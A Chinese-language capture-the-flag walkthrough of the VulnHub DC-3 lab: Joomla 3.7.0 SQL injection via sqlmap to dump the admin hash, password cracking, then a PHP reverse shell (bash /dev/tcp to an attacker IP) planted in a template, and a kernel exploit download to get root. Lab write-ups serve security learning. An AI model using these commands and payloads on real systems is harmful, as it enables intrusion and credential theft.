## 靶机简介

大家好，我是
`saulGoodman`，这篇文章是DC系列第三篇Walkthrough，总共有8篇，敬请期待！下载地址：<https://www.vulnhub.com/entry/dc-3,312/>这次靶机只有一个
`Flag`，也就是在 `/root` 目录下的！所以我们要提升为 `root` 权限！

## 信息搜集

拿到靶机后的第一件事就是对它进行端口扫描：

    
    
    nmap -A -p- -T4 192.168.1.103
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1191.png)

这边用 `NMAP` 扫描出来后发现它只开放了一个 `80` 端口，而且使用的 `CMS` 是 `Joomla`，这个 `CMS`
我之前完红日靶场遇到过一次。

既然 `CMS` 是 `Joomla` 那么就使用它的扫描工具对它一顿**吧：

    
    
    perl joomscan.pl -u http://192.168.1.103
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1192.png)

扫描出来后我们得到了两个关键信息，也就是它的版本和它的网站后台地址：

    
    
    版本：Joomla 3.7.0后台地址 : http://192.168.1.103/administrator/
    

先访问它的首页发现了一段提示信息：

    
    
    Welcome to DC-3.​This time, there is only one flag, one entry point and no clues.​To get the flag, you'll obviously have to gain root privileges.​How you get to be root is up to you - and, obviously, the system.​Good luck - and I hope you enjoy this little challenge.  :-)
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1193.png)

大概的意思就是说这个靶场只有一个Flag，要让我们取得 root 权限！

## Joomla SQL 注入

既然是这样那么我首先是搜索了有关于 `Joomla 3.7.0` 的漏洞信息，看看能不能捡个漏

    
    
    searchsploit Joomla 3.7.0
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1194.png)

由上图可见，它这个版本有一个 `SQL` 注入！既然有注入那么就丢到 `Sqlmap` 一把梭：

    
    
    sqlmap -u "http://192.168.1.103/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1195.png)

这边是注入出来了`五`个数据库，但是 `Joomla CMS` 默认的数据库为 `joomladb`，所以我们就直接跑这个数据库下的表把：

    
    
    sqlmap -u "http://192.168.1.103/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables
    
    
    
    [01:08:45] [INFO] fetching tables for database: 'joomladb'[01:08:45] [INFO] used SQL query returns 91 entriesDatabase: joomladb[76 tables]+---------------------+| #__assets           || #__associations     || #__banner_clients   || #__banner_tracks    || #__banners          || #__bsms_admin       || #__bsms_books       || #__bsms_comments    || #__bsms_locations   || #__bsms_mediafiles  || #__bsms_message_typ || #__bsms_podcast     || #__bsms_series      || #__bsms_servers     || #__bsms_studies     || #__bsms_studytopics || #__bsms_teachers    || #__bsms_templatecod || #__bsms_templates   || #__bsms_timeset     || #__bsms_topics      || #__bsms_update      || #__categories       || #__contact_details  || #__content_frontpag || #__content_rating   || #__content_types    || #__content          || #__contentitem_tag_ || #__core_log_searche || #__extensions       || #__fields_categorie || #__fields_groups    || #__fields_values    || #__fields           || #__finder_filters   || #__finder_links_ter || #__finder_links     || #__finder_taxonomy_ || #__finder_taxonomy  || #__finder_terms_com || #__finder_terms     || #__finder_tokens_ag || #__finder_tokens    || #__finder_types     || #__jbsbackup_timese || #__jbspodcast_times || #__languages        || #__menu_types       || #__menu             || #__messages_cfg     || #__messages         || #__modules_menu     || #__modules          || #__newsfeeds        || #__overrider        || #__postinstall_mess || #__redirect_links   || #__schemas          || #__session          || #__tags             || #__template_styles  || #__ucm_base         || #__ucm_content      || #__ucm_history      || #__update_sites_ext || #__update_sites     || #__updates          || #__user_keys        || #__user_notes       || #__user_profiles    || #__user_usergroup_m || #__usergroups       || #__users            || #__utf8_conversion  || #__viewlevels       |+---------------------+
    

跑出来的表有 `91` 条！但是我们只需要它后台管理员的用户那个表就好，接着我找到了一个为`#__users`的表，随后我开始注入它的列：

    
    
    sqlmap -u "http://192.168.1.103/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" --columns
    
    
    
    Database: joomladb
    Table: #__users
    [6 columns]
    +----------+-------------+
    | Column   | Type        |
    +----------+-------------+
    | email    | non-numeric |
    | id       | numeric     |
    | name     | non-numeric |
    | params   | non-numeric |
    | password | non-numeric |
    | username | non-numeric |
    +----------+-------------+
    

最后注入出它的 `username` 和 `password` 列的数据：

    
    
    sqlmap -u "http://192.168.1.103/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" -C username,password --dump
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1196.png)

注入出来后得到了账号和一段加密的`hash`：

    
    
    +----------+--------------------------------------------------------------+
    | username | password                                                     |
    +----------+--------------------------------------------------------------+
    | admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |
    +----------+--------------------------------------------------------------+
    

一般来说这种加密需要用字典来撞，运气好就能得到它的明文！我是使用 `KALI` 自带的 `john` 来破解它的 `hash`：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1197.png)

因为我之前使用 `john` 破解过 `pass` 的 `hash`了，`john`
只会对同一个文件破解一次，所以我直接查看了上一次的爆破结果密码为：`snoopy`！

## Joomla Getshell

拿到密码后我登陆到了网站到后台：

    
    
    http://192.168.1.103/administrator/index.php
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1198.png)

登陆到后台我来到了网站到模版处，添加了一个新的`php`页面，里面的代码是我们的反弹`shell`的代码：

    
    
    <?php
    system("bash -c 'bash -i >& /dev/tcp/192.168.1.128/4444 0>&1' ");
    ?>
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1199.png)

这个时候 `KALI` 用 `nc` 监听 `4444`，我们访问 `saul.php` 这个文件成功得到一枚`shell`：

    
    
    192.168.1.103/templates/beez3/saul.php
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1200.png)

## 权限提升

拿到`shell`只后我查看了一下内核版本发现系统是16年的 `Ubuntu`：

    
    
    uname -a
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1201.png)

紧接着我搜索有关于这个版本的漏洞发现了一个提权漏洞：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1202.png)

这是它的下载地址：

    
    
    https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
    

我把 `exp` 下载到本地只后，我 `KALI` 先是用 `python` 开启了一个简单的服务器用于靶机下载我们的 `exp`：

    
    
    python -m SimpleHTTPServer 8888
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1203.png)

随后靶机用 `wget` 把我们的 `exp` 下载到靶机上：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1204.png)

紧接着解压文件后，运行 `doubleput` 提权为 `root`：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1205.png)

最后也是在 `root` 目录下拿到了 `Flag`！

